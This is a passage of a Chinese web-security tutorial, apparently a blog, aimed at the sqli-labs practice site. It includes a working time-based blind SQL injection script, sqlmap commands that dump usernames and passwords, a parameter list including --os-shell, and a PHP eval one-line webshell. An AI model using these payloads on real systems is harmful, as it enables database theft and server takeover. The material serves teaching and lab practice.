comment"># 微秒数</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>microseconds<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单测试模型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"select database()"</span>res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">,1))=115, sleep(3),1) -- +"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本编写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token punctuation">,</span>ossession <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_info</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token comment"># 延时判断时间根据实际网络情况更改 sleep(3)</span>                    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(3),1) -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取数据内容,程序退出 中断于第 &#123;i&#125; 个字符."</span><span class="token punctuation">)</span>                                    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">True</span>                    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">,脚本运行结束"</span></span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"less9-data.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"# </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string"> : "</span></span> <span class="token operator">+</span> result <span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token comment"># 计算sql语句查询值长度</span><span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>sql<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>l<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 左右都闭合的区间 [l, r]</span>    <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>        <span class="token comment"># l+r的值右移1位，相当l+r的值除以2向下取整</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 如果页面正常，说明猜解正确 返回mid</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(3),1) -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> mid        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://www.sqli.com/Less-9/?id=1' and if(length((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">, sleep(3),1) -- +"</span></span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token string">"网络请求错误,无法获取sql查询结果长度,程序退出."</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token comment"># python 入口函数</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    list_of_arguments <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv    sql <span class="token operator">=</span> list_of_arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    length <span class="token operator">=</span> get_len<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"数据长度为: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>length<span class="token punctuation">&#125;</span></span><span class="token string"> , 开始获取内容"</span></span><span class="token punctuation">)</span>    get_info<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"运行完毕, 请打开文件查看: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\\less9-data.txt"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sqlmap自动化注入工具"><a href="#sqlmap自动化注入工具" class="headerlink" title="sqlmap自动化注入工具"></a>sqlmap自动化注入工具</h3><p>sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令</p><p><strong>基本参数使用</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">参数   含义<span class="token operator">-</span>h 查看帮助手册<span class="token operator">-</span>u 指定 url 地址<span class="token operator">-</span><span class="token operator">-</span>dbs 列出所有数据库的名字<span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db 列出当前数据库的名字<span class="token operator">-</span>D 指定一个数据库<span class="token operator">-</span><span class="token operator">-</span>tables 列出所有表名<span class="token operator">-</span>T 指定一个表<span class="token operator">-</span><span class="token operator">-</span>columns 列出所有字段名<span class="token operator">-</span>C 指定某些字段<span class="token operator">-</span><span class="token operator">-</span>dump 获取数据内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap基本使用"><a href="#sqlmap基本使用" class="headerlink" title="sqlmap基本使用"></a>sqlmap基本使用</h4><h5 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1.检测注入点"></a>1.检测注入点</h5><p>检测是否存在sql注入漏洞，注意get型注入提交的url中要有含义参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/58.PNG" alt="58"></p><p>如果结果中给出了注入点相关信息及payload，说明存在注入，可进一步挖掘数据</p><p><img src="/2023/012220963/59.PNG" alt="59"></p><h5 id="2-暴库"><a href="#2-暴库" class="headerlink" title="2.暴库"></a>2.暴库</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取当前库名</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/60.PNG" alt="60"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>dbs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/61.PNG" alt="61"></p><h5 id="3-暴表"><a href="#3-暴表" class="headerlink" title="3.暴表"></a>3.暴表</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span><span class="token operator">-</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/62.PNG" alt="62"></p><h5 id="4-暴字段"><a href="#4-暴字段" class="headerlink" title="4.暴字段"></a>4.暴字段</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span><span class="token operator">-</span>cloumns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/63.PNG" alt="63"></p><h5 id="5-暴数据"><a href="#5-暴数据" class="headerlink" title="5.暴数据"></a>5.暴数据</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取 security 库中 users 表中所有数据内容</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/64.PNG" alt="64"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取指定字段数据内容</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">-</span>C password<span class="token punctuation">,</span>username <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/65.PNG" alt="65"></p><h4 id="常见参数-1"><a href="#常见参数-1" class="headerlink" title="常见参数"></a>常见参数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">参数 含义<span class="token operator">-</span>p 标记注入点（指定注入参数）<span class="token operator">-</span><span class="token operator">-</span>data 指定post参数 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>data <span class="token string">"userid=aaa&amp;passwd=bbbb"</span><span class="token operator">-</span>r  读取文件内容作为检测数据，进行注入检测 eg<span class="token punctuation">:</span> <span class="token operator">-</span>r less1<span class="token punctuation">.</span>txt<span class="token operator">-</span><span class="token operator">-</span>level 设置测试的等级（<span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span>，默认为<span class="token number">1</span>）lv2：cookie<span class="token punctuation">;</span> lv3：user<span class="token operator">-</span>agent，refere<span class="token punctuation">;</span> lv5：host<span class="token operator">-</span><span class="token operator">-</span>risk 升高风险等级会增加数据被篡改的风险。risk <span class="token number">2</span>：基于事件的测试<span class="token punctuation">;</span>risk <span class="token number">3</span>：<span class="token keyword">or</span>语句的测试<span class="token punctuation">;</span>risk <span class="token number">4</span><span class="token operator">-</span><span class="token operator">-</span>random<span class="token operator">-</span>agent 随机ua进行测试<span class="token operator">-</span><span class="token operator">-</span>cookie       指定cookie进行请求测试<span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">-</span>shell     获取交互式shell<span class="token operator">-</span><span class="token operator">-</span>dbms         指定数据库类型 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>dbms<span class="token operator">=</span>mysql<span class="token operator">-</span><span class="token operator">-</span>os           指定目标操作系统 eg<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">=</span>windows<span class="token operator">-</span><span class="token operator">-</span>threads      设置线程数 <span class="token number">1</span><span class="token operator">~</span><span class="token number">10</span> ，默认为<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>post注入</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># --data 指定参数 -p 标记注入点</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=123123&amp;submit=Submit"</span> <span class="token operator">-</span>p uname<span class="token punctuation">,</span>passwd    <span class="token comment"># -r 读取数据包检测 -p 标记注入点</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span> <span class="token operator">-</span>r less11<span class="token punctuation">.</span>txt <span class="token operator">-</span>p uname<span class="token punctuation">,</span>passwd<span class="token comment"># --second-order 链接地址 //基于时间的注入</span>python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>r 文件 <span class="token operator">-</span><span class="token operator">-</span>second<span class="token operator">-</span>order<span class="token operator">=</span><span class="token string">"链接地址"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>less11.txt(burp抓包)</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>comContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">39</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>Origin<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>comContent<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedUser<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">101.0</span><span class="token number">.4951</span><span class="token number">.67</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>sqli<span class="token punctuation">.</span>com<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">11</span><span class="token operator">/</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> _dd_s<span class="token operator">=</span>logs<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token builtin">id</span><span class="token operator">=</span>43dd06af<span class="token operator">-</span><span class="token number">7456</span><span class="token operator">-</span>4c44<span class="token operator">-</span>899ba9e39defa9e4<span class="token operator">&amp;</span>created<span class="token operator">=</span><span class="token number">1652695481784</span><span class="token operator">&amp;</span>expire<span class="token operator">=</span><span class="token number">1652696582963</span>Connection<span class="token punctuation">:</span> closeuname<span class="token operator">=</span>admin<span class="token operator">&amp;</span>passwd<span class="token operator">=</span><span class="token number">123123</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SQLMAP参数大全"><a href="#SQLMAP参数大全" class="headerlink" title="SQLMAP参数大全"></a>SQLMAP参数大全</h3><p><a href="https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67">https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67</a></p><h2 id="SQL注入漏洞4"><a href="#SQL注入漏洞4" class="headerlink" title="SQL注入漏洞4"></a>SQL注入漏洞4</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>post注入就是参数以post形式提交且提交的参数与数据库有交互</p><h4 id="sqli-less11-select注入"><a href="#sqli-less11-select注入" class="headerlink" title="sqli-less11 select注入"></a>sqli-less11 select注入</h4><h5 id="1-寻找注入点-1"><a href="#1-寻找注入点-1" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点"><a href="#2-判断闭合符号-amp-amp-测试注入点" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句"><a href="#3-注入SQL语句" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入"><a href="#4-sqlmap注入" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h4 id="sqli-less17-update注入"><a href="#sqli-less17-update注入" class="headerlink" title="sqli-less17 update注入"></a>sqli-less17 update注入</h4><h5 id="1-寻找注入点-2"><a href="#1-寻找注入点-2" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h5><h5 id="2-判断闭合符号-amp-amp-测试注入点-1"><a href="#2-判断闭合符号-amp-amp-测试注入点-1" class="headerlink" title="2.判断闭合符号&amp;&amp;测试注入点"></a>2.判断闭合符号&amp;&amp;测试注入点</h5><h5 id="3-注入SQL语句-1"><a href="#3-注入SQL语句-1" class="headerlink" title="3.注入SQL语句"></a>3.注入SQL语句</h5><h5 id="4-sqlmap注入-1"><a href="#4-sqlmap注入-1" class="headerlink" title="4.sqlmap注入"></a>4.sqlmap注入</h5><h5 id="5-update注入注意事项"><a href="#5-update注入注意事项" class="headerlink" title="5.update注入注意事项"></a>5.update注入注意事项</h5><h3 id="header头-referer-注入"><a href="#header头-referer-注入" class="headerlink" title="header头(referer)注入"></a>header头(referer)注入</h3><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h3 id="文件读写注入"><a href="#文件读写注入" class="headerlink" title="文件读写注入"></a>文件读写注入</h3><h2 id="一句话木马与文件上传漏洞"><a href="#一句话木马与文件上传漏洞" class="headerlink" title="一句话木马与文件上传漏洞"></a>一句话木马与文件上传漏洞</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>​        文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而 WEB 系统没有进行检测或逻辑做的不够安全。文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。</p><p>​        文件上传攻击是指攻击者利用 Web 应用对上传文件过滤不严的漏洞，将应用程序定义类型范围之外的文件上传到 Web 服务器，并且此类文件通常为木马，在上传成功后，攻击者即可获得当前的webshell。</p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>​        木马，全称特洛伊木马(Trojan Horse)是指寄宿在计算机里的一种非授权的远程控制程序。由于特洛伊木马程序能够在计算机管理员未发觉的情况下开放系统权限、泄漏用户信息、甚至窃取整个计算机管理使用权限，使得它成为了黑客们最为常用的工具之一。</p><p>​        一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用.</p><h3 id="一句话木马尝试"><a href="#一句话木马尝试" class="headerlink" title="一句话木马尝试"></a>一句话木马尝试</h3><ol><li><p>准备一个php文件shell.php，里面写入一下内容：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 